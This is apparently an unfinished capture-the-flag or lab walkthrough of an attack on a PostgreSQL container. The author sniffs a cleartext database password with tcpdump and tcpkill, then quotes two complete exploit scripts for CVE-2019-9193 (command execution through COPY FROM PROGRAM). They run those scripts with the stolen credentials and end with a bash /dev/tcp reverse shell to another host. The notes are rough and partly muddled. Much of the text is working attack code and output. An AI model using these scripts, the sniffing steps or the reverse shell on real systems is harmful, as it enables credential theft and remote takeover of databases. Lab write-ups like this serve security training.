NOT ready yet

Running:
```
tcpkill -i eth0 host 172.19.0.2 and port 5432 & tcpdump -i eth0 -AX host 172.19.0.2 and port 5432
```

Output:  
```
[2] 1090
tcpkill: listening on eth0 [host 172.19.0.2 and port 5432]
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
...
18:05:27.760351 IP 0702d2dcd3d6.37940 > postgres_db.user_db_network.postgresql: Flags [P.], seq 9:70, ack 2, win 502, options [nop,nop,TS val 2819297090 ecr 2848438286], length 61
        0x0000:  4500 0071 c416 4000 7f06 df44 ac13 0003  E..q..@....D....
        0x0010:  ac13 0002 9434 1538 09ca a9fb 532f bfb1  .....4.8....S/..
        0x0020:  8018 01f6 588f 0000 0101 080a a80b 0f42  ....X..........B
        0x0030:  a9c7 b80e 0000 003d 0003 0000 7573 6572  .......=....user
        0x0040:  0075 7365 7200 6461 7461 6261 7365 006d  .user.database.m
        0x0050:  7964 6174 6162 6173 6500 6170 706c 6963  ydatabase.applic
        0x0060:  6174 696f 6e5f 6e61 6d65 0070 7371 6c00  ation_name.psql.
        0x0070:  00

...
18:05:27.761187 IP 0702d2dcd3d6.37940 > postgres_db.user_db_network.postgresql: Flags [P.], seq 70:100, ack 11, win 502, options [nop,nop,TS val 2819297091 ecr 2848438287], length 30
        0x0000:  4500 0052 c417 4000 7f06 df62 ac13 0003  E..R..@....b....
        0x0010:  ac13 0002 9434 1538 09ca aa38 532f bfba  .....4.8...8S/..
        0x0020:  8018 01f6 5870 0000 0101 080a a80b 0f43  ....Xp.........C
        0x0030:  a9c7 b80f 7000 0000 1d53 6563 7265 7450  ....p....SecretP
        0x0040:  6f73 7467 7265 5351 4c50 6173 7377 6f72  ostgreSQLPasswor
        0x0050:  6400  

18:05:27.771520 IP postgres_db.user_db_network.postgresql > 0702d2dcd3d6.37940: Flags [P.], seq 11:418, ack 100, win 509, options [nop,nop,TS val 2848438298 ecr 2819297091], length 407
        0x0000:  4500 01cb 85a9 4000 7f06 1c58 ac13 0002  E.....@....X....
        0x0010:  ac13 0003 1538 9434 532f bfba 09ca aa56  .....8.4S/.....V
        0x0020:  8018 01fd 59e9 0000 0101 080a a9c7 b81a  ....Y...........
        0x0030:  a80b 0f43 5200 0000 0800 0000 0053 0000  ...CR........S..
        0x0040:  0017 696e 5f68 6f74 5f73 7461 6e64 6279  ..in_hot_standby
        0x0050:  006f 6666 0053 0000 0019 696e 7465 6765  .off.S....intege
        0x0060:  725f 6461 7465 7469 6d65 7300 6f6e 0053  r_datetimes.on.S
        0x0070:  0000 0011 5469 6d65 5a6f 6e65 0055 5443  ....TimeZone.UTC
        0x0080:  0053 0000 001b 496e 7465 7276 616c 5374  .S....IntervalSt
        0x0090:  796c 6500 706f 7374 6772 6573 0053 0000  yle.postgres.S..
        0x00a0:  0014 6973 5f73 7570 6572 7573 6572 006f  ..is_superuser.o
        0x00b0:  6e00 5300 0000 1a61 7070 6c69 6361 7469  n.S....applicati
        0x00c0:  6f6e 5f6e 616d 6500 7073 716c 0053 0000  on_name.psql.S..
        0x00d0:  0026 6465 6661 756c 745f 7472 616e 7361  .&default_transa
        0x00e0:  6374 696f 6e5f 7265 6164 5f6f 6e6c 7900  ction_read_only.
        0x00f0:  6f66 6600 5300 0000 1a73 6372 616d 5f69  off.S....scram_i
        0x0100:  7465 7261 7469 6f6e 7300 3430 3936 0053  terations.4096.S
        0x0110:  0000 0017 4461 7465 5374 796c 6500 4953  ....DateStyle.IS
        0x0120:  4f2c 204d 4459 0053 0000 0023 7374 616e  O,.MDY.S...#stan
        0x0130:  6461 7264 5f63 6f6e 666f 726d 696e 675f  dard_conforming_
        0x0140:  7374 7269 6e67 7300 6f6e 0053 0000 001f  strings.on.S....
        0x0150:  7365 7373 696f 6e5f 6175 7468 6f72 697a  session_authoriz
        0x0160:  6174 696f 6e00 7573 6572 0053 0000 0019  ation.user.S....
        0x0170:  636c 6965 6e74 5f65 6e63 6f64 696e 6700  client_encoding.
        0x0180:  5554 4638 0053 0000 0018 7365 7276 6572  UTF8.S....server
        0x0190:  5f76 6572 7369 6f6e 0031 362e 3800 5300  _version.16.8.S.
        0x01a0:  0000 1973 6572 7665 725f 656e 636f 6469  ...server_encodi
        0x01b0:  6e67 0055 5446 3800 4b00 0000 0c00 0010  ng.UTF8.K.......
        0x01c0:  ddc2 13e8 b85a 0000 0005 49              .....Z....I
```

The credentials are:  
```
Final creds from the sniffed connection:
User: user
Password: SecretPostgreSQLPassword
Database: mydatabase
```

We can now login to the postgres by running:  
```
psql -h 172.19.0.2 -p 5432 -U user mydatabase 
```


From nmap know that the PosgreSQL version is 9.6 and after a check in the web we found that it is vulknerable to CVE-2019-9193.  


Exploit:  
```
# Exploit Title: PostgreSQL 9.6.1 - Remote Code Execution (RCE) (Authenticated)
# Date: 2023-02-01
# Exploit Author: Paulo Trindade (@paulotrindadec), Bruno Stabelini (@Bruno Stabelini), Diego Farias (@fulcrum) and Weslley Shaimon
# Github: https://github.com/paulotrindadec/CVE-2019-9193
# Version: PostgreSQL 9.6.1 on x86_64-pc-linux-gnu
# Tested on: Red Hat Enterprise Linux Server 7.9
# CVE: CVE-2019–9193
#!/usr/bin/python3
import sys
import psycopg2
import argparse
def parseArgs():
    parser = argparse.ArgumentParser(description='PostgreSQL 9.6.1 Authenticated Remote Code Execution')
    parser.add_argument('-i', '--ip', nargs='?', type=str, default='127.0.0.1', help='The IP address of the PostgreSQL DB [Default: 127.0.0.1]')
    parser.add_argument('-p', '--port', nargs='?', type=int, default=5432, help='The port of the PostgreSQL DB [Default: 5432]')
    parser.add_argument('-U', '--user', nargs='?', default='postgres', help='Username to connect to the PostgreSQL DB [Default: postgres]')
    parser.add_argument('-P', '--password', nargs='?', default='postgres', help='Password to connect to the the PostgreSQL DB [Default: postgres]')
    parser.add_argument('-c', '--command', nargs='?', help='System command to run')
    args = parser.parse_args()
    return args
def main():
	try:
		# Variables
		RHOST = args.ip
		RPORT = args.port
		USER = args.user
		PASS = args.password
		print(f"\r\n[+] Connect to PostgreSQL - {RHOST}")
		con = psycopg2.connect(host=RHOST, port=RPORT, user=USER, password=PASS)
		if (args.command):
			exploit(con)
		else:
			print ("[!] Add argument -c [COMMAND] to execute system commands")
	except psycopg2.OperationalError as e:
		print("Error")
		print ("\r\n[-] Failed to connect with PostgreSQL")
		exit()
def exploit(con):
	cur = con.cursor()
	CMD = args.command
	try:
		print('[*] Running\n')
		cur.execute("DROP TABLE IF EXISTS triggeroffsec;")
		cur.execute("DROP FUNCTION triggeroffsecexeccmd() cascade;")
		cur.execute("DROP TABLE IF EXISTS triggeroffsecsource;")
		cur.execute("DROP TRIGGER IF EXISTS shoottriggeroffsecexeccmd on triggeroffsecsource;")
		cur.execute("CREATE TABLE triggeroffsec (id serial PRIMARY KEY, cmdout text);")
		cur.execute("""CREATE OR REPLACE FUNCTION triggeroffsecexeccmd()
					RETURNS TRIGGER
					LANGUAGE plpgsql
					AS $BODY$
					BEGIN
		    			COPY triggeroffsec (cmdout) FROM PROGRAM %s;
		    			RETURN NULL;
					END;
					$BODY$;
					""",[CMD,]
					)
		cur.execute("CREATE TABLE triggeroffsecsource(s_id integer PRIMARY KEY);")
		cur.execute("""CREATE TRIGGER shoottriggeroffsecexeccmd
				    AFTER INSERT
				    ON triggeroffsecsource
				    FOR EACH STATEMENT
				    EXECUTE PROCEDURE triggeroffsecexeccmd();
				    """)
		cur.execute("INSERT INTO triggeroffsecsource VALUES (2);")
		cur.execute("TABLE triggeroffsec;")
		con.commit()
		returncmd = cur.fetchall()
		for result in returncmd:
			print(result)
	except (Exception, psycopg2.DatabaseError) as error:
	 	print(error)
	finally:
		if con is not None:
			con.close()
			#print("Closed connection")
if __name__ == "__main__":
    args = parseArgs()
    main()
```

Run:  
```
python3 a.py -i 172.19.0.2 -p 5432 -U user -P SecretPostgreSQLPassword -c "whoami"
```

https://github.com/b4keSn4ke/CVE-2019-9193/blob/main/cve-2019-9193.py
```
# Date: 2022-03-29
# Exploit Title: PostgreSQL 9.3-11.7 Authenticated Remote Code Execution 
# Exploit Author: b4keSn4ke
# Github: https://github.com/b4keSn4ke
# Vendor Homepage: https://www.postgresql.org/
# Software Link: https://www.postgresql.org/download/linux/debian/
# Version: 9.3 - 12.3
# Tested on: Linux x86-64 - Debian 4.19, 8.3.0
# CVE: CVE-2019–9193
# 
#!/usr/bin/python3 

import psycopg2
import argparse
import hashlib
import time

def parseArgs():
    parser = argparse.ArgumentParser(description='CVE-2019–9193 - PostgreSQL 9.3-12.3 Authenticated Remote Code Execution')
    parser.add_argument('-i', '--ip', nargs='?', type=str, default='127.0.0.1', help='The IP address of the PostgreSQL DB [Default: 127.0.0.1]')
    parser.add_argument('-p', '--port', nargs='?', type=int, default=5432, help='The port of the PostgreSQL DB [Default: 5432]')
    parser.add_argument('-d', '--database', nargs='?', default='template1', help='Name of the PostgreSQL DB [Default: template1]')
    parser.add_argument('-c', '--command', nargs='?', help='System command to run')
    parser.add_argument('-t', '--timeout', nargs='?', type=int, default=10, help='Connection timeout in seconds [Default: 10 (seconds)]')
    parser.add_argument('-U', '--user', nargs='?', default='postgres', help='Username to use to connect to the PostgreSQL DB [Default: postgres]')
    parser.add_argument('-P', '--password', nargs='?', default='postgres', help='Password to use to connect to the the PostgreSQL DB [Default: postgres]')
    args = parser.parse_args()
    return args

def main():
    try:
        print ("\r\n[+] Connecting to PostgreSQL Database on {0}:{1}".format(args.ip, args.port))
        connection = psycopg2.connect (
            database=args.database, 
            user=args.user, 
            password=args.password, 
            host=args.ip, 
            port=args.port, 
            connect_timeout=args.timeout
        )
        print ("[+] Connection to Database established")
        
        print ("[+] Checking PostgreSQL version")
        checkVersion(connection)

        if(args.command):
            exploit(connection)
        else:
            print ("[+] Add the argument -c [COMMAND] to execute a system command")

    except psycopg2.OperationalError as e:
        print ("\r\n[-] Connection to Database failed: \r\n{0}".format(e))
        exit()

def checkVersion(connection):
    cursor = connection.cursor()
    cursor.execute("SELECT version()")
    record = cursor.fetchall()
    cursor.close()

    result = deserialize(record)
    version = float(result[(result.find("PostgreSQL")+11):(result.find("PostgreSQL")+11)+4])

    if (version >= 9.3):
        print("[+] PostgreSQL {0} is likely vulnerable".format(version))

    else:
        print("[-] PostgreSQL {0} may not vulnerable".format(version))

def deserialize(record):
    result = ""
    for rec in record:
        result += rec[0]+"\r\n"
    return result

def randomizeTableName():
    return ("_" + hashlib.md5(time.ctime().encode('utf-8')).hexdigest())

def exploit(connection):
    cursor = connection.cursor()
    tableName = randomizeTableName()
    try:
        print ("[+] Creating table {0}".format(tableName))
        cursor.execute("DROP TABLE IF EXISTS {1};\
                        CREATE TABLE {1}(cmd_output text);\
                        COPY {1} FROM PROGRAM '{0}';\
                        SELECT * FROM {1};".format(args.command,tableName))

        print ("[+] Command executed\r\n")
        
        record = cursor.fetchall()
        result = deserialize(record)

        print(result)
        print ("[+] Deleting table {0}\r\n".format(tableName))

        cursor.execute("DROP TABLE {0};".format(tableName))
        cursor.close()

    except psycopg2.errors.ExternalRoutineException as e:
        print ("[-] Command failed : {0}".format(e.pgerror))
        print ("[+] Deleting table {0}\r\n".format(tableName))
        cursor = connection.cursor()
        cursor.execute("DROP TABLE {0};".format(tableName))
        cursor.close()

    finally:
        exit()

if __name__ == "__main__":
    args = parseArgs()
    main()
```
```
python3 b.py -i 172.19.0.2 -p 5432 -U user -P SecretPostgreSQLPassword -c "ls /dev" -d mydatabase
```
tcpkill -i eth0 host 172.19.0.2 and port 5432 & python3 a.py -i 172.19.0.2 -p 5432 -U user -P SecretPostgreSQLPassword -c "ls /"

But it failed:  
```
ModuleNotFoundError: No module named 'psycopg2'
```

When trying to install with `pip3` and `pip` it failed:  
```
root@0702d2dcd3d6:/# pip3 install psycopg2
error: externally-managed-environment

× This environment is externally managed
������> To install Python packages system-wide, try apt install
    python3-xyz, where xyz is the package you are trying to
    install.
    
    If you wish to install a non-Debian-packaged Python package,
    create a virtual environment using python3 -m venv path/to/venv.
    Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make
    sure you have python3-full installed.
    
    If you wish to install a non-Debian packaged Python application,
    it may be easiest to use pipx install xyz, which will manage a
    virtual environment for you. Make sure you have pipx installed.
    
    See /usr/share/doc/python3.12/README.venv for more information.

note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.
hint: See PEP 668 for the detailed specification.

```

Same thing with `apt`:
```
root@0702d2dcd3d6:/# apt install -y python3-psycopg2
E: dpkg was interrupted, you must manually run 'dpkg --configure -a' to correct the problem.
```


Eventually we were able to install it like that:  
```
root@0702d2dcd3d6:/# pip3 install psycopg2-binary --break-system-packages
Collecting psycopg2-binary
  Downloading psycopg2_binary-2.9.11-cp312-cp312-manylinux2014_x86_64.manylinux_2_17_x86_64.whl.metadata (4.9 kB)
Downloading psycopg2_binary-2.9.11-cp312-cp312-manylinux2014_x86_64.manylinux_2_17_x86_64.whl (4.2 MB)
   ����������������������������������������������������������������������������������������������������
   �����������������������������������������������������������������━━���������������������������������
   ����������������������������������������������������������������������������������������������������
   ������������������������������������������������������������������������������������������������������������������������ 4.2/4.2 MB 41.1 MB/s eta 0:00:00
Installing collected packages: psycopg2-binary
Successfully installed psycopg2-binary-2.9.11
WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv
```



We can run commands. So we want to get a shekll
To move between the shell you can use Ctrl+B and the arrows.  


```
python3 b.py -i 172.19.0.2 -p 5432 -U user -P SecretPostgreSQLPassword -c "ls /dev" -d mydatabase
python3 b.py -i 172.19.0.2 -p 5432 -U user -P SecretPostgreSQLPassword -c "bash -i >& /dev/tcp/172.19.0.3/1338 0>&1" -d mydatabase
python3 b.py -i 172.19.0.2 -p 5432 -U user -P SecretPostgreSQLPassword -c "nc -nvlp 1338" -d mydatabase
```
